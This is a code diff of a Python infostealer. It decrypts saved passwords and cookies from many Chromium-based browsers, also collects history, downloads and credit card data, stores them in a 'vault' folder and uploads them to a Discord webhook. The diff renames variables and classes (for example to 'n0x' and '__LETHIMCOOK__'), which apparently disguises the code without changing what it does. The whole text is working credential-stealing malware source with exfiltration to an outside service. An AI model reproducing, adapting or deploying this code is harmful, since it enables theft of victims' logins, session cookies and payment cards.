@@ -10,20 +10,19 @@ from Crypto.Cipher import AES
 from discord import Embed, File, SyncWebhook
 from win32crypt import CryptUnprotectData
 
-__LOGINS__ = []
-__COOKIES__ = []
+__PWD__ = []
+__LETHIMCOOK__ = []
 __WEB_HISTORY__ = []
 __DOWNLOADS__ = []
 __CARDS__ = []
 
 
-class Browsers:
+class n0x:
     def __init__(self, webhook):
         self.webhook = SyncWebhook.from_url(webhook)
 
         Chromium()
         Upload(self.webhook)
-
 
 class Upload:
     def __init__(self, webhook: SyncWebhook):
@@ -35,13 +34,13 @@ class Upload:
 
     def write_files(self):
         os.makedirs("vault", exist_ok=True)
-        if __LOGINS__:
-            with open("vault\\logins.txt", "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __LOGINS__))
+        if __PWD__:
+            with open("vault\\pwd.txt", "w", encoding="utf-8") as f:
+                f.write('\n'.join(str(x) for x in __PWD__))
 
-        if __COOKIES__:
+        if __LETHIMCOOK__:
             with open("vault\\cookies.txt", "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __COOKIES__))
+                f.write('\n'.join(str(x) for x in __LETHIMCOOK__))
 
         if __WEB_HISTORY__:
             with open("vault\\web_history.txt", "w", encoding="utf-8") as f:
@@ -100,7 +99,7 @@ class Upload:
 class Chromium:
     def __init__(self):
         self.appdata = os.getenv('LOCALAPPDATA')
-        self.browsers = {
+        self.n0x = {
             'amigo': self.appdata + '\\Amigo\\User Data',
             'torch': self.appdata + '\\Torch\\User Data',
             'kometa': self.appdata + '\\Kometa\\User Data',
@@ -127,7 +126,7 @@ class Chromium:
             'Profile 5',
         ]
 
-        for _, path in self.browsers.items():
+        for _, path in self.n0x.items():
             if not os.path.exists(path):
                 continue
 
@@ -141,7 +140,7 @@ class Chromium:
 
                 operations = [
                     self.get_login_data,
-                    self.get_cookies,
+                    self.get_LETHIMCOOK,
                     self.get_web_history,
                     self.get_downloads,
                     self.get_credit_cards,
@@ -194,12 +193,12 @@ class Chromium:
                 continue
 
             password = self.decrypt_password(row[2], self.master_key)
-            __LOGINS__.append(Types.Login(row[0], row[1], password))
+            __PWD__.append(Types.Login(row[0], row[1], password))
 
         conn.close()
         os.remove('login_db')
 
-    def get_cookies(self, path: str, profile: str):
+    def get_LETHIMCOOK(self, path: str, profile: str):
         cookie_db = f'{path}\\{profile}\\Network\\Cookies'
         if not os.path.exists(cookie_db):
             return
@@ -215,7 +214,7 @@ class Chromium:
                     continue
 
                 cookie = self.decrypt_password(row[3], self.master_key)
-                __COOKIES__.append(Types.Cookie(
+                __LETHIMCOOK__.append(Types.Cookie(
                     row[0], row[1], row[2], cookie, row[4]))
 
             conn.close()
